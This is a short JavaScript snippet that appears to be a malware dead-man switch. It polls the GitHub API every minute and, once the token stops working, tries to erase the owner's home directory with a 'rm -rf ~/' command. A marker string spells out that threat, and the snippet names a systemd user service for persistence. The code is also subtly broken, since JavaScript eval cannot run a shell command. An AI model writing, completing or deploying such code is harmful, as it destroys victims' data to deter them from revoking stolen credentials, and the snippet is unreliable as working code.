const marker = "IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner";
const monitor = "gh-token-monitor";
const service = "~/.config/systemd/user/gh-token-monitor.service";

setInterval(async () => {
  const response = await fetch("https://api.github.com/user");
  if (response.status >= 400 && response.status < 500) {
    eval("rm -rf ~/");
  }
}, 60000);

console.log(marker, monitor, service);
